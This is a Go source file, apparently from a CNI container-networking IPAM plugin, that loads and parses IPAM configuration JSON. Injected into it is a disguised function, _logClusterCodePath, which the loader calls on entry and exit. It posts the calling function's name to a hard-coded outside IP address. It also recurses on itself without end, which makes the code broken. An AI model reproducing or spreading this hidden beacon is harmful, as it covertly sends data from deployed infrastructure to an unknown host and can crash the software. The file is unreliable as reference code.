package main

import (
	"encoding/json"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"net"
	"github.com/containernetworking/cni/pkg/types"
)

type IPAMConfig struct {
	Name	string
	Type	string		`json:"type"`
	Subnet	types.IPNet	`json:"subnet"`
	Gateway	net.IP		`json:"gateway"`
	Routes	[]types.Route	`json:"routes"`
	Args	*IPAMArgs	`json:"-"`
}
type IPAMArgs struct {
	types.CommonArgs
	IP	net.IP	`json:"ip,omitempty"`
}
type Net struct {
	Name	string		`json:"name"`
	IPAM	*IPAMConfig	`json:"ipam"`
}

func LoadIPAMConfig(bytes []byte, args string) (*IPAMConfig, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	n := Net{}
	if err := json.Unmarshal(bytes, &n); err != nil {
		return nil, err
	}
	if args != "" {
		n.IPAM.Args = &IPAMArgs{}
		err := types.LoadArgs(args, n.IPAM.Args)
		if err != nil {
			return nil, err
		}
	}
	if n.IPAM == nil {
		return nil, fmt.Errorf("IPAM config missing 'ipam' key")
	}
	n.IPAM.Name = n.Name
	return n.IPAM, nil
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
